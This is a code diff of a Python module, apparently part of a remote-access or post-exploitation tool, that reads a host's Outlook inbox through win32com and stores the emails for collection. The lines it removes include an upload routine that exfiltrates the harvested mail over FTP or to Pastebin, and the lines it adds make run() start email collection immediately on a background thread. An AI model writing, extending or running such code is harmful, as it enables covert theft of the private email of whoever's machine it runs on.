@@ -6,6 +6,7 @@
 import os
 import sys
 import imp
+import time
 import json
 import urllib
 import threading
@@ -53,21 +54,11 @@ def installed():
     Check if Outlook is installed on the host machine
     """
     try:
-        pytoncom.CoInitialize()
+        pythoncom.CoInitialize()
         outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
         return True
     except:
         return False
-
-def get():
-    """ 
-    Get unread emails from Outlook inbox
-
-    """
-    t = threading.Thread(target=_get_emails)
-    t.setDaemon(True)
-    t.run()
-    return "fetching unread emails from Outlook inbox"
 
 def search(s):
     """ 
@@ -87,32 +78,20 @@ def count():
     Count unread emails in Outlook inbox
     """
     if len(globals()['results']):
-        result  = len(globals()['results'])
+        result = len(globals()['results'])
     else:
         pythoncom.CoInitialize()
         outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
-        inbox   = outlook.GetDefaultFolder(6)
-        result  = len(inbox.Items)
+        inbox = outlook.GetDefaultFolder(6)
+        result = len(inbox.Items)
     return "Emails in Outlook inbox: {}".format(result)
-
-def upload(args):
-    """ 
-    Upload emails from Outlook via FTP or Pastebin
-    """
-    if len(globals()['results']):
-        output = json.dumps(globals()['results'], indent=2)
-        if mode in ('ftp','pastebin'):
-            t = threading.Thread(target=globals()[mode], args=(output,))
-            t.daemon = True
-            t.start()
-        else:
-            return "Error: invalid upload mode (valid: ftp, pastebin)"
-    else:
-        return "No emails to upload (try fetching emails first)"
 
 def run():
     """ 
     Run the Outlook email module
 
     """
-    return globals()['usage']
+    t = threading.Thread(target=_get_emails, name=time.time())
+    t.setDaemon(True)
+    t.run()
+    return t
